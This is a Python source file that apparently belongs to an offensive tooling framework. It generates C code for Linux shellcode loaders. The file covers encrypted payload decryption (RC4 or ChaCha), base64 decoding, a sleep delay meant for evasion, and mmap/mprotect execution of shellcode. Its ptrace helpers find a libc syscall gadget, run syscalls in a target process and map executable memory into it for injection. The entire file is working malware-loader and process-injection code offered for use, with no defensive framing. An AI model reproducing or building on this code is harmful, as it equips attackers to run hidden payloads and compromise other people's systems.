#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared C preamble/decryption for Linux injection loaders."""

from __future__ import annotations

from lib.compile.syscall_evasion import SyscallEvasionBuilder, _to_c_string


class LinuxInjectionBuilder(SyscallEvasionBuilder):
    """Encrypt shellcode and emit Linux mmap-based decode/decrypt fragments."""

    def decrypt_block(self, key: bytes, iv=None, *, dest: str = "shellcode_buf") -> str:
        if self.cipher == "rc4":
            return f"""
            {_to_c_string(key, "key")}
            RC4(key, decoded, {dest}, payload_size);
"""
        if iv is None:
            raise ValueError("iv is required for chacha cipher")
        return f"""
            {_to_c_string(key, "key")}
            {_to_c_string(iv, "iv")}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, decoded, {dest}, (unsigned long)payload_size);
"""

    def sleep_block(self) -> str:
        if self.sleep_ms <= 0:
            return ""
        return f"for (int i = 0; i < 10; i++) {{ usleep(({self.sleep_ms} / 10) * 1000); }}"

    def decode_preamble(self, encoded_var: str = "enc_payload") -> str:
        return f"""
    int enc_len = (int)strlen({encoded_var});
    unsigned char *decoded = (unsigned char *)malloc((size_t)enc_len);
    if (!decoded) return 1;
    int payload_size = base64decode(decoded, {encoded_var}, enc_len);
    if (payload_size <= 0) return 1;
    unsigned char *shellcode_buf = (unsigned char *)mmap(
        NULL, (size_t)payload_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_buf == MAP_FAILED) return 1;
"""

    def headers(self) -> list[str]:
        items = [
            "#define _GNU_SOURCE",
            "#include <stdint.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <sys/mman.h>",
            '#include "base64.h"',
        ]
        if self.cipher == "rc4":
            items.append('#include "rc4.h"')
        else:
            items.append('#include "chacha.h"')
        return items

    def exec_shellcode_block(self, var: str = "shellcode_buf", size_var: str = "payload_size") -> str:
        return f"""
    if (mprotect({var}, (size_t){size_var}, PROT_READ | PROT_EXEC) != 0) return 1;
    {self.sleep_block()}
    ((void (*)(void)){var})();
"""

    def cleanup_block(self, var: str = "shellcode_buf", size_var: str = "payload_size") -> str:
        return f"""
    munmap({var}, (size_t){size_var});
    free(decoded);
"""

    def ptrace_remote_syscall_helpers(self) -> str:
        """Shared ptrace helpers: TRACEME spawn, libc syscall gadget, remote mmap."""
        return r"""
#ifndef PTRACE_SYSCALL
#define PTRACE_SYSCALL 24
#endif

static int wait_stop(pid_t pid, int *status)
{
    if (waitpid(pid, status, 0) < 0)
        return -1;
    return WIFSTOPPED(*status) ? 0 : -1;
}

static unsigned long find_syscall_gadget(pid_t pid)
{
    char path[256];
    char line[512];
    unsigned long start = 0, end = 0;
    FILE *maps;
    int fd;
    unsigned char buf[4096];
    ssize_t n;
    size_t off;

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    maps = fopen(path, "r");
    if (!maps) return 0;
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "libc") && strstr(line, "r-xp")) {
            if (sscanf(line, "%lx-%lx", &start, &end) == 2)
                break;
        }
    }
    fclose(maps);
    if (!start || end <= start) return 0;

    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    for (off = 0; start + off + 2 < end; ) {
        size_t chunk = sizeof(buf);
        if (start + off + chunk > end)
            chunk = (size_t)(end - (start + off));
        if (chunk < 3) break;
        if (lseek(fd, (off_t)(start + off), SEEK_SET) < 0)
            break;
        n = read(fd, buf, chunk);
        if (n < 3) break;
        for (ssize_t i = 0; i + 2 < n; i++) {
            if (buf[i] == 0x0f && buf[i + 1] == 0x05 && buf[i + 2] == 0xc3) {
                close(fd);
                return start + off + (unsigned long)i;
            }
        }
        off += (size_t)(n >= 2 ? n - 2 : n);
    }
    close(fd);
    return 0;
}

static long remote_syscall6_attached(pid_t pid, struct user_regs_struct *saved,
    long nr, unsigned long a0, unsigned long a1, unsigned long a2,
    unsigned long a3, unsigned long a4, unsigned long a5)
{
    struct user_regs_struct regs;
    unsigned long gadget;
    int status;

    gadget = find_syscall_gadget(pid);
    if (!gadget) return -1;

    regs = *saved;
    regs.rax = (unsigned long)nr;
    regs.orig_rax = (unsigned long)nr;
    regs.rdi = a0;
    regs.rsi = a1;
    regs.rdx = a2;
    regs.r10 = a3;
    regs.r8 = a4;
    regs.r9 = a5;
    regs.rip = gadget;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
        return -1;
    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
        return -1;
    if (wait_stop(pid, &status) < 0)
        return -1;
    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
        return -1;
    if (wait_stop(pid, &status) < 0)
        return -1;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
        return -1;
    return (long)regs.rax;
}

static unsigned long remote_mmap_attached(pid_t pid, struct user_regs_struct *saved, size_t len)
{
    size_t map_len = (len + 0xfffUL) & ~0xfffUL;
    if (map_len == 0) map_len = 0x1000;
    return (unsigned long)remote_syscall6_attached(
        pid, saved, 9, 0, map_len,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0);
}

static int libc_is_mapped(pid_t pid)
{
    char path[256];
    char line[512];
    FILE *maps;
    int found = 0;

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    maps = fopen(path, "r");
    if (!maps) return 0;
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "libc") && strstr(line, "r-xp")) {
            found = 1;
            break;
        }
    }
    fclose(maps);
    return found;
}

static pid_t spawn_traceable_target(const char *cmd)
{
    pid_t pid = fork();
    if (pid == 0) {
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0)
            _exit(127);
        raise(SIGSTOP);
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    return pid;
}

static int wait_until_execed(pid_t pid)
{
    int status;
    int i;

    if (wait_stop(pid, &status) < 0)
        return -1;
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0)
        return -1;
    if (wait_stop(pid, &status) < 0)
        return -1;

    /* Dynamic linker stop: step syscalls until libc RX is mapped. */
    for (i = 0; i < 2000 && !libc_is_mapped(pid); i++) {
        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
            return -1;
        if (wait_stop(pid, &status) < 0)
            return -1;
    }
    return libc_is_mapped(pid) ? 0 : -1;
}
"""
